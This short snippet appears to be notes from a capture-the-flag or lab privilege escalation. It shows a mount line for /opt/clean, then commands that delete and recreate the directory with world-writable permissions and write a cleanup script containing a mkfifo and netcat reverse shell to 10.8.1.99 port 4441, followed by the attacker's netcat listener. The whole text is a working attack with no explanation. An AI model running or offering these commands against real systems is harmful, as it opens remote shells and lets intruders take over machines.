```
/dev/xvda1 on /opt/clean type ext4 (rw,relatime,errors=remount-ro,data=ordered)

chmod 777 /opt/clean
rm -rf /opt/clean
mkdir /opt/clean
chmod 777 /opt/clean
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.1.99 4441 >/tmp/f" > /opt/clean/clean.sh
chmod 777 /opt/clean/clean.sh

attacker: nc -lvnp 4441
```